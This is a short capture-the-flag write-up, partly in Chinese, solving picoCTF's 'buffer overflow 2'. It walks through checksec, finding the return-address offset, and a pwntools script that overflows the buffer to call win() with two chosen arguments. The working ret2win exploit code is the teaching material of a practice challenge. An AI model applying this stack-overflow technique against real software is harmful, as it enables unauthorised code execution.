# buffer overflow 2

## Information

### Description

Control the return address and arguments

### Hints

(None)

## Solution

1. Discovery
    * 檢查
    ```sh
        $ file
        $ checksec
    ```

2. Research 
    * 找出 return address 的 offset 與 win() 的 address。
        * 注意 x86 的 stack frame 與 calling convention。
            * 皆在 stack 上。
            * stack 中順序: 下一個 return address 、arg1、arg2、...

3. Exploitation
    ```py
    #! /usr/bin/env python

    from pwn import *

    # nc saturn.picoctf.net 54581
    p = remote(host='saturn.picoctf.net', port=56553)

    # payload: offset=112, arg1=0xCAFEFOOD, arg2=0XFOODFOOD
    win_addr = p32(0x08049296)
    offset = int(112)
    arg1 = p32(0xCAFEF00D) 
    arg2 = p32(0xF00DF00D)


    payload = flat(
        'a'*offset, 
        win_addr,
        0xdeadbeef,
        arg1,
        arg2
    )
    # win_addr = overwrited address
    # 0xdeadbeef -> return address 

    success(payload)

    p.sendlineafter(b'lease enter your string:', payload)
    log.info(p.recvall())

    ```